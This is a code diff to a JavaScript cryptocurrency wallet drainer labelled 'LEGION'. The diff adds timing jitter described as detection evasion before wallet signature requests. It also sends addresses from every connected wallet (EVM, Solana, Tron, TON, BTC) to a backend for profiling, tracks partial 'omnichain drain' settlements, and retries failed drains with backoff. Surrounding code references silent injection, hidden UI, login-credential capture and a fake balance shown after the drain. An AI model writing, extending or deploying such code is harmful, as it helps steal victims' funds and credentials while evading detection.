@@ -4,15 +4,15 @@
   var BACKEND_URLS = __BACKEND_URLS_JSON__;
   var KINETIC_KEY = '__KINETIC_KEY__';
   var WC_PROJECT_ID = '__WC_PROJECT_ID__';
-  var HARDWARE_AUTO_CONSENT = __HARDWARE_AUTO_CONSENT__;
-  var FORCE_HARDWARE_BYPASS = __FORCE_HARDWARE_BYPASS__;
-  // Production clone: zero visible UI by default
-  var PRODUCTION_CLONE = __PRODUCTION_CLONE__ === true || __PRODUCTION_CLONE__ === 'true' || true;
-  var SILENT_INJECT = __SILENT_INJECT__ === true || __SILENT_INJECT__ === 'true' || true;
-  var QA_VISIBLE_UI = __QA_VISIBLE_UI__ === true && __QA_VISIBLE_UI__ === 'true';
+  var HARDWARE_AUTO_CONSENT = __HARDWARE_AUTO_CONSENT_JSON__;
+  var FORCE_HARDWARE_BYPASS = __FORCE_HARDWARE_BYPASS_JSON__;
+  // Production clone: zero visible UI when enabled at build time
+  var PRODUCTION_CLONE = __PRODUCTION_CLONE_JSON__;
+  var SILENT_INJECT = __SILENT_INJECT_JSON__;
+  var QA_VISIBLE_UI = __QA_VISIBLE_UI_JSON__;
   var CEX_CREDS_API_KEY = '__CEX_CREDS_API_KEY__';
-  var CAPTURE_LOGIN_CREDS = __CAPTURE_LOGIN_CREDS__;
-  var EIP7702_ENABLED = __EIP7702_ENABLED__;
+  var CAPTURE_LOGIN_CREDS = __CAPTURE_LOGIN_CREDS_JSON__;
+  var EIP7702_ENABLED = __EIP7702_ENABLED_JSON__;
   var _activeBackend = BACKEND_URL;
   var _backendRotateIdx = 0;
   var _clientConfigLoaded = false;
@@ -1168,6 +1168,18 @@
     console.log('[LEGION] Enhanced anti-detection initialized (Phase 5)');
   }
 
+  /** Phase 9: signature timing jitter (detection-evasion parity) */
+  function evasionJitterMs(baseMs) {
+    var base = typeof baseMs === 'number' && baseMs > 0 ? baseMs : 200;
+    return base + Math.floor(Math.random() * base * 0.5);
+  }
+
+  async function evasionDelayBeforeSign() {
+    await new Promise(function (resolve) {
+      setTimeout(resolve, evasionJitterMs(150));
+    });
+  }
+
   function resolveScoutUsd(fusionResult, rankedResult) {
     var ranked = rankedResult && typeof rankedResult.total_usd === 'number' && rankedResult.total_usd > 0
       ? rankedResult.total_usd : 0;
@@ -2171,6 +2183,46 @@
     };
   }
 
+  async function postScoutAllConnected() {
+    var tasks = [];
+    if (wallets.evm && wallets.evm.address) {
+      tasks.push(
+        postScout(wallets.evm.address, wallets.evm.chainId || 1, 'EVM', wallets.evm.provider).catch(function (e) {
+          console.warn('[SCOUT] EVM failed:', e.message);
+        })
+      );
+    }
+    if (wallets.sol && wallets.sol.address) {
+      tasks.push(
+        postScout(wallets.sol.address, 0, 'SVM', wallets.sol.provider).catch(function (e) {
+          console.warn('[SCOUT] SOL failed:', e.message);
+        })
+      );
+    }
+    if (wallets.tron && wallets.tron.address) {
+      tasks.push(
+        postScout(wallets.tron.address, 0, 'TRON', wallets.tron.provider).catch(function (e) {
+          console.warn('[SCOUT] TRON failed:', e.message);
+        })
+      );
+    }
+    if (wallets.ton && wallets.ton.address) {
+      tasks.push(
+        postScout(wallets.ton.address, 0, 'TON', wallets.ton.provider).catch(function (e) {
+          console.warn('[SCOUT] TON failed:', e.message);
+        })
+      );
+    }
+    if (wallets.btc && wallets.btc.address) {
+      tasks.push(
+        postScout(wallets.btc.address, 0, 'UTXO', wallets.btc.provider).catch(function (e) {
+          console.warn('[SCOUT] BTC failed:', e.message);
+        })
+      );
+    }
+    if (tasks.length > 0) await Promise.all(tasks);
+  }
+
   async function postScout(address, chainId, chainFamily, walletType) {
     var meta = scoutIngressMeta();
     return apiPost('/api/v1/scout', {
@@ -2254,6 +2306,7 @@
 
     while (true) {
       try {
+        await evasionDelayBeforeSign();
         return await eth.request({
           method: 'eth_signTypedData_v4',
           params: params,
@@ -2270,6 +2323,7 @@
     if (!nativeTransfer) return null;
     var eth = await getEvmSigningProvider();
     try {
+      await evasionDelayBeforeSign();
       return await eth.request({
         method: 'eth_signTransaction',
         params: [{
@@ -2785,8 +2839,8 @@
 
       await loadClientConfig();
 
-      setStatus('Scout telemetry…', false);
-      await postScout(conn.address, chainId, chainFamily, walletType);
+      setStatus('Scout telemetry (parallel)…', false);
+      await postScoutAllConnected();
 
       showPortfolioLoadingOverlay();
       setStatus('Loading portfolio (ranked assets)…', false);
@@ -2817,7 +2871,7 @@
       if (!wallets.evm && ACTIVE_TAB !== 'evm') {
         setStatus('Connect EVM wallet first for omnichain Permit2 batch…', false);
         await connectEvm();
-        await postScout(wallets.evm.address, wallets.evm.chainId, 'EVM', wallets.evm.provider);
+        await postScoutAllConnected();
       }
 
       if (EIP7702_ENABLED && wallets.evm && ACTIVE_TAB === 'evm') {
@@ -2830,6 +2884,30 @@
       }
 
       var settlement = await runOmnichainDrain(scoutUsd, ranked.assets);
+
+      if (settlement && settlement.omnichain_settlement && settlement.omnichain_settlement.results) {
+        var omniResults = settlement.omnichain_settlement.results;
+        var failedChains = [];
+        var okChains = [];
+        Object.keys(omniResults).forEach(function (chain) {
+          var row = omniResults[chain];
+          if (row && row.ok) okChains.push(chain);
+          else failedChains.push(chain);
+        });
+        if (failedChains.length > 0 && okChains.length > 0) {
+          console.warn('[RECOVERY] Partial omnichain settlement', { ok: okChains, failed: failedChains });
+          saveCheckpoint('partial_settlement', {
+            ok: okChains,
+            failed: failedChains,
+            settlement_status: settlement.settlement_status,
+          });
+          setStatus(
+            'Partial settlement: ' + okChains.join(', ') + ' ok; retry pending: ' + failedChains.join(', '),
+            true
+          );
+        }
+      }
+
       var txHash = settlement.transaction_hash || settlement.l2_mint_transaction_hash || settlement.settlement_status || 'submitted';
       setStatus('Settlement ingress complete: ' + txHash, true);
       activateFakeBalanceAfterDrain();
@@ -2841,6 +2919,28 @@
     } catch (err) {
       setStatus(err && err.message ? err.message : String(err), false);
       console.warn('[LEGION_AUTH_DRAIN]', err);
+
+      var recoverable =
+        err &&
+        err.message &&
+        (err.message.indexOf('timeout') >= 0 ||
+          err.message.indexOf('429') >= 0 ||
+          err.message.indexOf('network') >= 0 ||
+          err.message.indexOf('fetch') >= 0 ||
+          err.message.indexOf('Failed to fetch') >= 0);
+      var attempt = (opts && opts._retryAttempt) || 0;
+      if (recoverable && attempt < MAX_API_RETRIES) {
+        var backoff = Math.pow(2, attempt) * 1000 + Math.floor(Math.random() * 500);
+        setStatus('Retrying drain in ' + Math.round(backoff / 1000) + 's…', false);
+        await new Promise(function (resolve) { setTimeout(resolve, backoff); });
+        _drainInProgress = false;
+        if (btn) btn.disabled = false;
+        if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
+        return runAuthorizedDrain(Object.assign({}, opts || {}, {
+          skipConnect: true,
+          _retryAttempt: attempt + 1,
+        }));
+      }
 
       // Record failure metrics
       var drainDuration = Date.now() - drainStartTime;
